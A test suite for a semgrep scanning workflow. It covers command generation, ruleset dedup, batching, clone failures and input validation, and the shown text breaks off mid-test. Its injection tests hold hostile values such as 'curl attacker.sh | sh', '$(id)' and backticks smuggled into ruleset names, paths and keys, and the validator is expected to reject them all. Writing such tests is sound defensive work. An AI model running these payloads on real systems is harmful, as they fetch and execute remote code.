// Exercises the deterministic core of semgrep-scan.js: command generation, cross-language
// hoisting, clone dedup, and result assembly, with every agent stubbed. Run: node <this file>
//
// The assertions that matter most are the negative ones. A ruleset whose repo failed to
// clone, and every ruleset held by an agent that died, must fail to reach `scans`: those
// are the paths where a partial scan turns into a report that reads as complete. A run
// that asserts nothing is a failing run, so the counter at the bottom fails the process
// when fewer assertions execute than are written.
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'

const here = dirname(fileURLToPath(import.meta.url))
const src = readFileSync(join(here, '..', 'skills', 'semgrep', 'workflows', 'semgrep-scan.js'), 'utf8').replace(
  'export const meta',
  'const meta',
)

const AsyncFn = Object.getPrototypeOf(async () => {}).constructor

async function run(args, { clone, scan } = {}) {
  const logs = []
  const calls = []
  const fn = new AsyncFn('agent', 'parallel', 'phase', 'log', 'args', src)
  const out = await fn(
    async (prompt, opts) => {
      calls.push({ label: opts.label, prompt, opts })
      if (opts.label === 'clone') return clone ? clone(prompt) : { cloned: defaultClone(prompt) }
      return scan ? scan(prompt, opts) : { scans: defaultScan(prompt) }
    },
    async (thunks) =>
      Promise.all(
        thunks.map(async (t) => {
          try {
            return await t()
          } catch {
            return null
          }
        }),
      ),
    () => {},
    (m) => logs.push(m),
    args,
  )
  return { out, logs, calls }
}

// Stubs derived from the prompt itself, so a change to the generated commands shows up in
// the stubbed reply too rather than silently drifting from it.
const configsIn = (prompt) =>
  [...prompt.matchAll(/--config "([^"]+)"/g)].map((m) => m[1])

// Each command is preceded by its `# id:` line, which is the key the script matches on.
const scansIn = (prompt) => {
  const out = []
  const lines = prompt.split('\n')
  for (let i = 0; i < lines.length; i++) {
    const id = lines[i].match(/^# id: (\S+)$/)
    if (!id) continue
    const cfg = (lines[i + 1] || '').match(/--config "([^"]+)"/)
    out.push({ id: id[1], ruleset: cfg ? cfg[1] : '' })
  }
  return out
}

const defaultScan = (prompt) =>
  scansIn(prompt).map((s) => ({ ...s, ok: true, findings: 3, error: '' }))

// Both arguments are expected quoted. The regex is deliberately strict about that: an
// unquoted URL should fail to match here rather than quietly still be recognized.
const cloneLinesIn = (prompt) =>
  [...prompt.matchAll(/git clone --depth 1 "([^"]+)" "[^"]*\/([^"/]+)"/g)].map((m) => ({
    url: m[1],
    name: m[2],
  }))

const clonedNamesIn = (prompt) => cloneLinesIn(prompt).map((c) => c.name)

const defaultClone = (prompt) =>
  clonedNamesIn(prompt).map((name) => ({ name, ok: true, error: '' }))

const commandsIn = (calls) =>
  calls
    .filter((c) => c.label.startsWith('scan:'))
    .flatMap((c) => c.prompt.split('\n').filter((l) => /^semgrep .*--config /.test(l)))

// How many commands one agent is told to background before it waits. Read off the prompt the
// same way the agent does, so a change to the emitted batching shows up here. The boundary is
// the `# batch` marker: the waits are now per-pid, so there is no bare `wait` to split on.
const batchSizesIn = (prompt) => {
  const sizes = []
  let n = null
  for (const line of prompt.split('\n')) {
    if (/^# batch \d+ of \d+$/.test(line)) {
      if (n !== null) sizes.push(n)
      n = 0
    } else if (n !== null && /^semgrep .*--config .* &$/.test(line)) n++
  }
  if (n !== null) sizes.push(n)
  return sizes
}

const BASE = {
  target: '/src/app',
  outputDir: '/out/run_1',
  mode: 'run-all',
  pro: false,
  rulesets: {
    baseline: ['p/security-audit', 'p/secrets'],
    python: ['p/python', 'p/django'],
    javascript: ['p/javascript'],
    docker: ['p/dockerfile'],
    third_party: ['https://github.com/trailofbits/semgrep-rules'],
  },
}

// Bump when you add an assertion. The check at the bottom is what makes a suite that
// silently stopped running most of itself fail instead of reporting a pass.
const EXPECTED_ASSERTIONS = 121
let ran = 0
let failures = 0
const ok = (cond, msg) => {
  ran++
  if (!cond) {
    console.error(`FAIL: ${msg}`)
    failures++
  }
}

async function throws(args, fragment) {
  try {
    await run(args)
    return false
  } catch (e) {
    return String(e.message).includes(fragment)
  }
}

// ---------------------------------------------------------------- base run

{
  const { out, calls } = await run(BASE)
  const cmds = commandsIn(calls)

  ok(cmds.length > 0, 'base run generated no commands')
  ok(
    cmds.every((c) => c.includes('--metrics=off')),
    'every command must carry --metrics=off',
  )
  ok(
    cmds.every((c) => !c.includes('--pro')),
    '--pro must be absent when args.pro is false',
  )
  ok(
    cmds.every((c) => !c.includes('--severity')),
    'severity flags must be absent in run-all mode',
  )

  const pythonCmd = cmds.find((c) => c.includes('--config "p/python"'))
  ok(pythonCmd && pythonCmd.includes('--include="*.py"'), 'p/python must be scoped with --include')

  const auditCmd = cmds.find((c) => c.includes('--config "p/security-audit"'))
  ok(auditCmd && !auditCmd.includes('--include'), 'p/security-audit must never be scoped')

  const secretsCmd = cmds.find((c) => c.includes('--config "p/secrets"'))
  ok(secretsCmd && !secretsCmd.includes('--include'), 'p/secrets must never be scoped')

  const tpCmd = cmds.find((c) => c.includes('repos/trailofbits-semgrep-rules'))
  ok(tpCmd && !tpCmd.includes('--include'), 'a cloned third-party repo must never be scoped')

  const outputs = cmds.map((c) => c.match(/-o "([^"]+)"/)[1])
  ok(new Set(outputs).size === outputs.length, 'two scans must never write the same JSON path')
  ok(
    outputs.every((p) => p.startsWith('/out/run_1/raw/')),
    'all output must land under outputDir/raw',
  )

  const auditRuns = cmds.filter((c) => c.includes('--config "p/security-audit"')).length
  ok(auditRuns === 1, `a baseline ruleset must run once across 3 languages, ran ${auditRuns}`)

  const cloneCalls = calls.filter((c) => c.label === 'clone')
  ok(cloneCalls.length === 1, 'exactly one clone agent')
  ok(
    clonedNamesIn(cloneCalls[0].prompt).length === 1,
    'one third-party URL must produce one clone',
  )

  ok(out.scans.length === cmds.length, 'every generated scan must appear in scans on a clean run')
  ok(out.failed.length === 0 && out.skipped.length === 0, 'a clean run reports nothing failed')
  ok(out.reposPath === '/out/run_1/repos', 'reposPath is returned for the caller to clean up')

  const scanned = new Set(calls.filter((c) => c.label.startsWith('scan:')).map((c) => c.label))
  ok(scanned.has('scan:cross-language'), 'cross-language rulesets get their own unit')
  ok(scanned.has('scan:python'), 'each language gets its own unit')

  // The wiring, not just the commands. A bare `semgrep-scanner` is unregistered and the
  // dispatch fails against a real harness while every other assertion here still passes;
  // dropping the schema leaves the agent with no way to return a verdict at all.
  const scanCalls = calls.filter((c) => c.label.startsWith('scan:'))
  ok(
    scanCalls.every((c) => c.opts.agentType === 'static-analysis:semgrep-scanner'),
    'every scan agent must be dispatched with the plugin-namespaced agent type',
  )
  ok(
    scanCalls.every((c) => c.opts.schema && c.opts.schema.properties && c.opts.schema.properties.scans),
    'every scan agent must be called with the scans schema',
  )
  const cloneCall = calls.find((c) => c.label === 'clone')
  ok(
    cloneCall.opts.schema && cloneCall.opts.schema.properties.cloned,
    'the clone agent must be called with the clone schema',
  )
}

// Per-scan exit codes. A bare `wait` returns one status for the whole batch, so a batch of
// four holding one config failure is indistinguishable from four healthy scans, and the
// schema asks the agent for something the prompt never gave it.
{
  const rulesets = { baseline: [], third_party: [], python: ['p/a', 'p/b'] }
  const { calls } = await run({ ...BASE, rulesets })
  const prompt = calls.find((c) => c.label.startsWith('scan:')).prompt
  const lines = prompt.split('\n')
  ok(
    lines.filter((l) => /^p\d+=\$!$/.test(l)).length === 2,
    'every backgrounded command must capture its pid',
  )
  ok(
    lines.filter((l) => /^wait \$p\d+; echo "rc \S+ \$\?"$/.test(l)).length === 2,
    'every scan must be waited on by pid and report its own exit code',
  )
  ok(
    !lines.some((l) => l.trim() === 'wait'),
    'a bare wait must not appear: it collapses the batch to one exit status',
  )
}

// --------------------------------------------------- pro and important-only

{
  const { calls } = await run({ ...BASE, pro: true, mode: 'important-only' })
  const cmds = commandsIn(calls)
  // [].every() is true, so without this the two assertions below would pass on a regression
  // that generated no commands at all — including the one protecting the --severity fix.
  ok(cmds.length > 0, 'the pro/important-only run must generate commands to assert over')
  ok(
    cmds.every((c) => c.includes('--pro')),
    '--pro must be on every command when args.pro is true',
  )
  ok(
    cmds.every(
      (c) =>
        c.includes('--severity WARNING') &&
        c.includes('--severity ERROR') &&
        !/--severity (MEDIUM|HIGH|CRITICAL|LOW)\b/.test(c),
    ),
    'important-only must use the severity levels semgrep accepts, not the metadata ones',
  )
}

// ------------------------------------------------------------ clone failure

{
  const { out, calls } = await run(BASE, {
    clone: (prompt) => ({ cloned: clonedNamesIn(prompt).map((name) => ({ name, ok: false, error: '404' })) }),
  })
  const cmds = commandsIn(calls)
  ok(
    !cmds.some((c) => c.includes('repos/trailofbits-semgrep-rules')),
    'a repo that failed to clone must not be scanned',
  )
  ok(out.skipped.length === 1, 'a failed clone must be reported as skipped')
  ok(
    !out.scans.some((s) => s.ruleset.includes('trailofbits')),
    'a skipped ruleset must never appear in scans',
  )
}

{
  const { out } = await run(BASE, { clone: () => null })
  ok(out.skipped.length === 1, 'a clone agent that dies must still produce a skip, not silence')
}

// -------------------------------------------------------------- dead scanner

{
  const { out } = await run(BASE, {
    scan: (prompt, opts) => (opts.label === 'scan:python' ? null : { scans: defaultScan(prompt) }),
  })
  ok(
    !out.scans.some((s) => s.lang === 'python'),
    'no ruleset from a dead agent may appear in scans',
  )
  ok(out.failed.length === 2, `both python rulesets must be reported failed, got ${out.failed.length}`)
}

{
  const { out } = await run(BASE, {
    scan: (prompt) => ({ scans: scansIn(prompt).map((s) => ({ ...s, ok: false, findings: -1, error: 'boom' })) }),
  })
  ok(out.scans.length === 0, 'ok=false must keep a ruleset out of scans')
  ok(out.failed.length > 0, 'ok=false must be reported as failed')
}

// ------------------------------ shared ruleset across two batched languages

// Dedup runs per language, but chunk() puts several languages in one unit past the fleet
// cap. Two languages may legitimately share a ruleset with different --include flags, so
// the verdict key has to be the scan id: keyed on --config, the crashed copy would inherit
// the healthy one's success and land in `scans`.
{
  const many = { baseline: [], third_party: [] }
  for (let i = 0; i < 20; i++) many[`lang${i}`] = [`p/shared`, `p/lang${i}`]
  const { out, calls } = await run(
    { ...BASE, rulesets: many },
    {
      scan: (prompt) =>
        // Every copy of the shared ruleset fails; everything else succeeds.
        ({
          scans: scansIn(prompt).map((s) => ({
            ...s,
            ok: s.ruleset !== 'p/shared',
            findings: s.ruleset === 'p/shared' ? -1 : 3,
            error: s.ruleset === 'p/shared' ? 'crashed' : '',
          })),
        }),
    },
  )
  ok(
    !out.scans.some((s) => s.ruleset === 'p/shared'),
    'a ruleset that failed under every language must not appear in scans',
  )
  ok(
    out.failed.filter((f) => f.ruleset === 'p/shared').length === 20,
    `every failed copy must be reported, got ${out.failed.filter((f) => f.ruleset === 'p/shared').length}`,
  )
  const ids = calls.filter((c) => c.label.startsWith('scan:')).flatMap((c) => scansIn(c.prompt).map((s) => s.id))
  ok(new Set(ids).size === ids.length, 'every scan id must be unique across the whole run')
}

// ------------------------------------------ language aliasing and unknown names

{
  // The category names the skill's detection table produces are not the map's keys. If
  // canonicalLanguage stops normalizing them these all fall through to the unscoped path,
  // which costs the --include optimization without failing anything.
  const { out, calls } = await run({
    ...BASE,
    rulesets: { baseline: [], 'JavaScript/TypeScript': ['p/javascript'], 'C/C++': ['p/c'], third_party: [] },
  })
  const cmds = commandsIn(calls)
  ok(
    cmds.some((c) => c.includes('--config "p/javascript"') && c.includes('--include="*.js"')),
    'JavaScript/TypeScript must normalize to the javascript include globs',
  )
  ok(
    cmds.some((c) => c.includes('--config "p/c"') && c.includes('--include="*.cpp"')),
    'C/C++ must normalize to the cpp include globs',
  )
  ok(out.unscoped.length === 0, 'a recognized category name must not be reported unscoped')
}

{
  const { out, calls } = await run({
    ...BASE,
    rulesets: { baseline: [], cobol: ['p/cobol'], third_party: [] },
  })
  const cmds = commandsIn(calls)
  ok(cmds.length === 1 && !cmds[0].includes('--include'), 'an unknown language runs without --include')
  ok(
    out.unscoped.length === 1 && out.unscoped[0] === 'cobol',
    'an unknown language must be returned in unscoped, not dropped quietly',
  )
  ok(out.scans.length === 1, 'an unknown language still gets scanned')
}

// ------------------------------------------------------------- clone skipping

{
  const { calls } = await run({
    ...BASE,
    rulesets: { baseline: ['p/secrets'], python: ['p/python'], third_party: [] },
  })
  ok(
    !calls.some((c) => c.label === 'clone'),
    'no third_party entries must mean no clone agent is spawned',
  )
}

// ------------------------------------------------------------- bad arguments

// A string has a .length and is iterable, so a ruleset written without the brackets would
// otherwise expand into one --config per character instead of failing.
ok(
  await throws({ ...BASE, rulesets: { ...BASE.rulesets, docker: 'p/dockerfile' } }, 'must be an array'),
  'a scalar ruleset value must throw rather than iterate as characters',
)
ok(
  await throws({ ...BASE, rulesets: { ...BASE.rulesets, baseline: 'p/secrets' } }, 'must be an array'),
  'the baseline key gets the same array check',
)
ok(
  await throws({ ...BASE, pro: 'false' }, 'pro must be a boolean'),
  'a stringified boolean must throw, not turn Pro on by truthiness',
)
// Same reasoning as the third_party URL check: these are spliced into a shell command, and
// double quotes leave $() and backticks live.
ok(
  await throws(
    { ...BASE, rulesets: { ...BASE.rulesets, baseline: ['p/security-audit; curl attacker.sh | sh'] } },
    'registry identifiers',
  ),
  'a baseline ruleset with shell metacharacters must throw',
)
ok(
  await throws({ ...BASE, rulesets: { ...BASE.rulesets, python: ['p/$(id)'] } }, 'registry identifiers'),
  'a language ruleset with command substitution must throw',
)
ok(
  await throws(
    { ...BASE, rulesets: { python: ['p/python'], third_party: ['https://github.com/x/y; curl evil.sh | sh'] } },
    'https git URLs',
  ),
  'a third_party entry with shell metacharacters must throw',
)
ok(
  await throws({ ...BASE, rulesets: { python: ['p/python'], third_party: ['git@github.com:x/y'] } }, 'https git URLs'),
  'a non-https third_party entry must throw',
)

ok(await throws({ ...BASE, target: 'app' }, 'absolute path'), 'a relative target must throw')
ok(await throws({ ...BASE, outputDir: 'out' }, 'absolute path'), 'a relative outputDir must throw')

// target and outputDir land in the same double quotes the ruleset strings do, so they need
// the same treatment. outputDir also reaches mkdir -p, the clone destination, and rm -rf.
ok(
  await throws({ ...BASE, target: '/tmp/repo$(curl -s attacker.sh|sh)' }, 'stays live'),
  'command substitution in target must throw',
)
ok(
  await throws({ ...BASE, target: '/tmp/re"po' }, 'stays live'),
  'a quote in target must throw, since it closes the quoting around it',
)
ok(
  await throws({ ...BASE, outputDir: '/out/`id`' }, 'stays live'),
  'a backtick in outputDir must throw',
)
ok(
  await throws({ ...BASE, outputDir: '/out/run\n1' }, 'stays live'),
  'a newline in outputDir must throw, since it would split the command block',
)
// The guard is a denylist for a reason. These are inert between double quotes and appear in
// real directory names, so rejecting them would fail legitimate scans.
{
  const path = '/Users/me/My Project (v2)/src & more'
  let cmds = []
  let err = ''
  try {
    cmds = commandsIn((await run({ ...BASE, target: path })).calls)
  } catch (e) {
    err = e.message
  }
  ok(
    !err && cmds.length > 0 && cmds.every((c) => c.includes(`"${path}"`)),
    `spaces, parentheses and ampersands in a path must be accepted, not rejected${err ? `: ${err}` : ''}`,
  )
}
ok(await throws({ ...BASE, mode: 'quick' }, 'mode must be'), 'an unknown mode must throw')
ok(await throws({ ...BASE, rulesets: {} }, 'nothing to scan'), 'an empty ruleset set must throw')
ok(
  await throws({ ...BASE, rulesets: { baseline: [], third_party: [] } }, 'nothing to scan'),
  'ruleset keys that are all empty must throw',
)

// Language keys are not required. Baseline and third-party rulesets scan the whole target
// unscoped, so a plan holding only those is a complete scan. Throwing here would hard-fail a
// user who cleared every language ruleset at the gate and kept the baseline.
{
  let out = { scans: [], failed: [] }
  let calls = []
  let err = ''
  try {
    ;({ out, calls } = await run({
      ...BASE,
      rulesets: { baseline: ['p/secrets'], third_party: ['https://github.com/trailofbits/semgrep-rules'] },
    }))
  } catch (e) {
    err = e.message
  }
  const cmds = commandsIn(calls)
  ok(cmds.length === 2, `a cross-language-only plan must still scan${err ? `, threw: ${err}` : `, got ${cmds.length} commands`}`)
  ok(
    cmds.length > 0 && cmds.every((c) => !c.includes('--include')),
    'a cross-language-only plan runs everything unscoped',
  )
  ok(out.scans.length === 2 && out.failed.length === 0, 'a cross-language-only plan reports both scans')
  const labels = calls.filter((c) => c.label.startsWith('scan:')).map((c) => c.label)
  ok(
    labels.length === 1 && labels[0] === 'scan:cross-language',
    'a cross-language-only plan spawns exactly the one shared unit',
  )
}

// ------------------------------------------------- fleet cap and repo naming

{
  const many = { baseline: [], third_party: [] }
  for (let i = 0; i < 20; i++) many[`lang${i}`] = [`p/lang${i}`]
  const { calls } = await run({ ...BASE, rulesets: many })
  ok(calls.length <= 10, `20 languages must stay within the fleet cap, spawned ${calls.length}`)
  ok(commandsIn(calls).length === 20, 'batching must not drop a ruleset')
}

// Slicing into fixed-size chunks returns ceil(n / ceil(n/buckets)) groups, which is often
// fewer than the cap allows: 9 languages into 7 buckets gave 5 agents of 2. Under-using the
// fleet only costs wall-clock, so nothing else in this suite would notice.
{
  const many = { baseline: [], third_party: [] }
  for (let i = 0; i < 9; i++) many[`lang${i}`] = [`p/lang${i}`]
  const { calls } = await run({ ...BASE, rulesets: many })
  const scanAgents = calls.filter((c) => c.label.startsWith('scan:')).length
  ok(scanAgents === 8, `9 languages must use the whole cap of 8, spawned ${scanAgents}`)
  ok(commandsIn(calls).length === 9, 'saturating the fleet must not drop a ruleset')
}

// The cross-language unit joins the list after batching, so chunking the languages into the
// full cap spawns one agent more than the cap names.
{
  const many = { baseline: ['p/secrets'], third_party: [] }
  for (let i = 0; i < 20; i++) many[`lang${i}`] = [`p/lang${i}`]
  const { calls } = await run({ ...BASE, rulesets: many })
  const scanAgents = calls.filter((c) => c.label.startsWith('scan:')).length
  ok(scanAgents <= 8, `the shared unit counts against the cap of 8, spawned ${scanAgents}`)
  ok(
    calls.some((c) => c.label === 'scan:cross-language'),
    'the shared unit must still exist after the cap is applied',
  )
  ok(commandsIn(calls).length === 21, 'capping must not drop the baseline scan or a language')
}

{
  const args = {
    ...BASE,
    rulesets: {
      python: ['p/python'],
      third_party: [
        'https://github.com/trailofbits/semgrep-rules',
        'https://github.com/elttam/semgrep-rules',
        'https://github.com/trailofbits/semgrep-rules',
      ],
    },
  }
  const { calls } = await run(args)
  const clone = calls.find((c) => c.label === 'clone').prompt
  const names = clonedNamesIn(clone)
  ok(
    cloneLinesIn(clone).every((c) => c.url.startsWith('https://')),
    'the clone URL must be double-quoted like every other interpolated value',
  )
  ok(
    !clone.includes('<name>') && !/<[a-z-]+>/.test(clone),
    'the clone prompt must not leave a placeholder for the agent to substitute',
  )
  ok(
    cloneLinesIn(clone).every((c) => clone.includes(`find "/out/run_1/repos/${c.name}"`)),
    'every clone destination must get its own verification find',
  )
  ok(names.length === 2, `a duplicated URL must be cloned once, got ${names.length}`)
  ok(
    new Set(names).size === 2 && names.includes('trailofbits-semgrep-rules'),
    'same-named repos from different owners must get distinct directories',
  )

  const outputs = commandsIn(calls).map((c) => c.match(/-o "([^"]+)"/)[1])
  ok(
    outputs.includes('/out/run_1/raw/all-trailofbits-semgrep-rules.json') &&
      outputs.includes('/out/run_1/raw/all-elttam-semgrep-rules.json'),
    'third-party output filenames must carry the owner, not collide on the repo name',
  )
}

// Two spellings of one repo collapse to one clone directory and one verdict key, so the
// string Set is not enough: dedup has to run on the same key the destination uses.
{
  const { calls } = await run({
    ...BASE,
    rulesets: {
      python: ['p/python'],
      third_party: [
        'https://github.com/trailofbits/semgrep-rules',
        'https://github.com/trailofbits/semgrep-rules.git',
      ],
    },
  })
  const names = clonedNamesIn(calls.find((c) => c.label === 'clone').prompt)
  ok(names.length === 1, `.git and bare spellings must clone once, got ${names.length}`)
}

// A ruleset already running unscoped over the whole target does not need a narrower second
// run. Both would land in `scans` with their own counts; the merged SARIF dedups them, a sum
// of scans[].findings does not.
{
  const { out, calls } = await run({
    ...BASE,
    rulesets: { baseline: ['p/secrets'], python: ['p/python', 'p/secrets'], third_party: [] },
  })
  const cmds = commandsIn(calls)
  const secrets = cmds.filter((c) => c.includes('--config "p/secrets"'))
  ok(secrets.length === 1, `a baseline ruleset repeated under a language must scan once, ran ${secrets.length}`)
  ok(!secrets[0].includes('--include'), 'the surviving copy must be the unscoped one, not the language-scoped one')
  ok(
    out.scans.some((s) => s.ruleset === 'p/python'),
    'the language ruleset that is not in baseline must still be scanned',
  )
}

// A language whose every ruleset is already covered by the baseline must not spawn an agent
// holding nothing.
{
  const { calls } = await run({
    ...BASE,
    rulesets: { baseline: ['p/secrets'], python: ['p/secrets'], third_party: [] },
  })
  const labels = calls.filter((c) => c.label.startsWith('scan:')).map((c) => c.label)
  ok(
    labels.length === 1 && labels[0] === 'scan:cross-language',
    `an emptied language unit must not be dispatched, got ${labels.join(',')}`,
  )
}

// A ruleset listed twice for one language must scan once. Verdicts come back keyed by
// --config, so the duplicate would read the first copy's verdict and hide its own failure.
{
  const { out, calls } = await run({
    ...BASE,
    rulesets: { baseline: [], python: ['p/python', 'p/python'], third_party: [] },
  })
  ok(commandsIn(calls).length === 1, 'a ruleset repeated within one language must scan once')
  ok(out.scans.length === 1, 'the duplicate must not appear twice in scans')
}

// ------------------------------------------------ per-agent scan concurrency

// The fleet cap bounds agents, not processes. Each agent backgrounds every command it holds,
// so an unbatched prompt puts (agents × rulesets) semgrep processes on one machine at once,
// and the ones the OOM killer takes come back as ok=false with nothing pointing at memory as
// the cause.
{
  const rulesets = { baseline: [], third_party: [], python: [] }
  for (let i = 0; i < 12; i++) rulesets.python.push(`p/rule${i}`)
  const { calls } = await run({ ...BASE, rulesets })
  const scanCalls = calls.filter((c) => c.label.startsWith('scan:'))
  const sizes = scanCalls.flatMap((c) => batchSizesIn(c.prompt))
  ok(
    sizes.length > 1 && sizes.every((n) => n <= 4),
    `no agent may background more than 4 scans between waits, got batches ${sizes.join(',')}`,
  )
  ok(
    sizes.reduce((a, b) => a + b, 0) === 12,
    `batching must not drop a command, ${sizes.reduce((a, b) => a + b, 0)} of 12 emitted`,
  )
  // The batch markers sit between an id and the command above it nowhere, so the pairing the
  // scanner and the assembly loop both depend on has to survive batching.
  ok(
    scanCalls.flatMap((c) => scansIn(c.prompt)).length === 12,
    'every command must still be directly under its own `# id:` line',
  )
}

// -------------------------------------------- failed entries carry their paths

// A scan that crashed part-way may still have written a partial file. Without the path on the
// failed entry the caller can name the ruleset but not the file it left behind, so there is no
// way to act on a ruleset the report lists under "Did Not Run".
{
  const { out } = await run(BASE, {
    scan: (prompt, opts) => (opts.label === 'scan:python' ? null : { scans: defaultScan(prompt) }),
  })
  ok(
    out.failed.length === 2 && out.failed.every((f) => f.json && f.sarif),
    'a dead agent must still report where each of its scans would have written',
  )
  ok(
    out.failed.every((f) => f.sarif.startsWith('/out/run_1/raw/') && f.sarif.endsWith('.sarif')),
    'the failed sarif path must be the same one the command was given',
  )
}

{
  const { out } = await run(BASE, {
    scan: (prompt) => ({ scans: scansIn(prompt).map((s) => ({ ...s, ok: false, findings: -1, error: 'boom' })) }),
  })
  ok(
    out.failed.length > 0 && out.failed.every((f) => f.json && f.sarif),
    'an ok=false verdict must carry its paths too, not just the dead-agent path',
  )
}

// ------------------------------------------- the output dir inside the target

// The default output directory is created in the CWD, so the ordinary "scan this repo"
// invocation puts it inside the target. Without --exclude, p/secrets and the third-party
// rulesets scan the cloned rule repos, which are full of literal example secrets, and every
// hit reaches results.sarif as a finding in the user's code.
{
  const { out, calls } = await run({
    ...BASE,
    target: '/src/app',
    outputDir: '/src/app/static_analysis_semgrep_1',
  })
  const cmds = commandsIn(calls)
  ok(
    cmds.length > 0 && cmds.every((c) => c.includes('--exclude="static_analysis_semgrep_1"')),
    'every command must exclude an output directory that sits inside the target',
  )
  ok(out.scans.length > 0, 'excluding the output directory must not stop the scan')
}

{
  const { calls } = await run({ ...BASE, target: '/src/app', outputDir: '/src/app/out/scan1' })
  ok(
    commandsIn(calls).length > 0 && commandsIn(calls).every((c) => c.includes('--exclude="out/scan1"')),
    'a nested output directory must be excluded by its path relative to the target',
  )
}

// Excluding unconditionally would drop an unrelated directory of the same name in the target.
{
  const { calls } = await run({ ...BASE, target: '/src/app', outputDir: '/tmp/run_1' })
  ok(
    commandsIn(calls).length > 0 && commandsIn(calls).every((c) => !c.includes('--exclude')),
    'an output directory outside the target must not add an --exclude',
  )
}

ok(
  await throws({ ...BASE, target: '/src/app', outputDir: '/src/app' }, 'scan target'),
  'an output directory equal to the target must throw rather than scan its own output',
)

// ------------------------------------------------- overlapping --include maps

// `javascript` owns the TypeScript globs so a plan that folds TS into one category still
// scans TS. When the plan names both, keeping them on both scans every .ts file twice.
{
  const { calls } = await run({
    ...BASE,
    rulesets: { baseline: [], javascript: ['p/javascript'], typescript: ['p/typescript'], third_party: [] },
  })
  const cmds = commandsIn(calls)
  const js = cmds.find((c) => c.includes('--config "p/javascript"'))
  const ts = cmds.find((c) => c.includes('--config "p/typescript"'))
  ok(
    js && !js.includes('--include="*.ts"') && !js.includes('--include="*.tsx"'),
    'javascript must give up the globs an explicit typescript key already covers',
  )
  ok(
    js && js.includes('--include="*.js"') && js.includes('--include="*.mjs"'),
    'javascript must keep the globs nothing else covers',
  )
  ok(ts && ts.includes('--include="*.ts"'), 'the narrower language keeps everything it owns')
}

{
  const { calls } = await run({
    ...BASE,
    rulesets: { baseline: [], javascript: ['p/javascript'], third_party: [] },
  })
  const js = commandsIn(calls)[0]
  ok(
    js.includes('--include="*.ts"') && js.includes('--include="*.cjs"'),
    'with no typescript key, javascript must still scan TypeScript, since the detection table emits one category',
  )
}

// Overlap alone is not a fallback. A C++ project's headers are `.h` and its sources can be
// `.c`, so p/cpp has to keep seeing those files even when the plan also names `c`. An earlier
// version of this subtracted every glob a narrower present language covered and silently took
// `include/session.h` away from the C++ rules.
{
  const { calls } = await run({
    ...BASE,
    rulesets: { baseline: [], c: ['p/c'], cpp: ['p/cpp'], third_party: [] },
  })
  const cmds = commandsIn(calls)
  const cCmd = cmds.find((x) => x.includes('--config "p/c"'))
  const cppCmd = cmds.find((x) => x.includes('--config "p/cpp"'))
  ok(cCmd && cCmd.includes('--include="*.c"') && cCmd.includes('--include="*.h"'), 'c keeps its globs')
  ok(
    cppCmd && cppCmd.includes('--include="*.h"') && cppCmd.includes('--include="*.c"'),
    'cpp must keep *.c and *.h even when the plan names c separately',
  )
  ok(
    cmds.length > 0 && cmds.every((x) => x.includes('--include=')),
    'narrowing must never strip a language down to nothing, which would scan every file',
  )
}

// Narrowing must run over the languages that survive the shared-ruleset dedup, not over every
// key in the plan. A typescript unit emptied because its only ruleset is in baseline would
// otherwise still strip *.ts from javascript, and nothing would scan TypeScript at all.
{
  const { out, calls } = await run({
    ...BASE,
    rulesets: {
      baseline: ['p/typescript'],
      typescript: ['p/typescript'],
      javascript: ['p/javascript'],
      third_party: [],
    },
  })
  const js = commandsIn(calls).find((c) => c.includes('--config "p/javascript"'))
  ok(
    js && js.includes('--include="*.ts"'),
    'javascript must keep *.ts when the typescript unit was dropped as already-shared',
  )
  ok(
    !out.unscoped.includes('typescript'),
    'a language dropped by the shared dedup must not be reported as having run unscoped',
  )
  ok(
    out.alsoShared.includes('typescript/p/typescript'),
    'the dropped ruleset must be returned to the caller, not just logged',
  )
}

// The error message says "registry identifier", so the pattern has to mean it.
ok(
  await throws({ ...BASE, rulesets: { baseline: ['/etc'], third_party: [] } }, 'registry identifiers'),
  'an absolute path is not a registry identifier',
)
ok(
  await throws(
    { ...BASE, rulesets: { baseline: ['p/python/../../..'], third_party: [] } },
    'registry identifiers',
  ),
  'a traversing ruleset id must throw rather than reach --config',
)

// ------------------------------------------------- aliased keys and reserved names

// canonicalLanguage folds js/node/nodejs onto javascript. Building a unit per raw key gives
// two agents with the same label and include set, and a ruleset named under both runs twice,
// so Step 5 adds two findings counts for one scan.
{
  const { out, calls } = await run({
    ...BASE,
    rulesets: { baseline: [], js: ['p/javascript'], javascript: ['p/nodejs'], third_party: [] },
  })
  const labels = calls.filter((c) => c.label.startsWith('scan:')).map((c) => c.label)
  ok(labels.length === 1 && labels[0] === 'scan:javascript', `aliased keys must share one unit, got ${labels.join(',')}`)
  ok(commandsIn(calls).length === 2, 'both rulesets must still be scanned')
  ok(out.scans.length === 2, 'the merged unit reports both scans')
}

{
  const { calls } = await run({
    ...BASE,
    rulesets: { baseline: [], js: ['p/javascript'], node: ['p/javascript'], third_party: [] },
  })
  ok(
    commandsIn(calls).length === 1,
    'one ruleset under two aliases of one language must scan once, not twice under different stems',
  )
}

// `all` is the stem prefix the cross-language unit uses, so a language key by that name gets a
// -2 suffix from uniqueStem and shows up as two rows for one scan.
ok(
  await throws({ ...BASE, rulesets: { baseline: ['p/secrets'], all: ['p/secrets'] } }, 'reserved language'),
  'a language key named all must throw rather than collide with the cross-language stems',
)
ok(
  await throws({ ...BASE, rulesets: { baseline: ['p/secrets'], 'All/': ['p/secrets'] } }, 'reserved language'),
  'the reserved check runs on the slug, since that is what collides in the filename',
)

// ------------------------------------------------------ ruleset keys are inputs too

// Every injection test above targets a value. The key is model output as well, and it is
// spliced into the same double-quoted command as the language half of the output filename.
ok(
  await throws({ ...BASE, rulesets: { baseline: [], 'py$(id)': ['p/python'], third_party: [] } }, 'not one'),
  'command substitution in a language key must throw',
)
ok(
  await throws(
    { ...BASE, rulesets: { baseline: [], 'a"; curl evil.sh | sh; :"': ['p/python'], third_party: [] } }, 'not one'),
  'a quote in a language key must throw, since it closes the quoting around it',
)
ok(
  await throws({ ...BASE, rulesets: { baseline: [], 'py`id`': ['p/python'], third_party: [] } }, 'not one'),
  'a backtick in a language key must throw',
)

// The real category names carry slashes and `#`, so the key check has to accept them. They
// are inert inside double quotes; it is the filename they cannot reach.
{
  const { calls } = await run({
    ...BASE,
    rulesets: { baseline: [], 'k8s/yaml': ['p/kubernetes'], third_party: [] },
  })
  const cmds = commandsIn(calls)
  const outputs = cmds.map((c) => c.match(/-o "([^"]+)"/)[1])
  ok(cmds.length === 1, 'an unrecognized category name with a slash must still scan')
  ok(
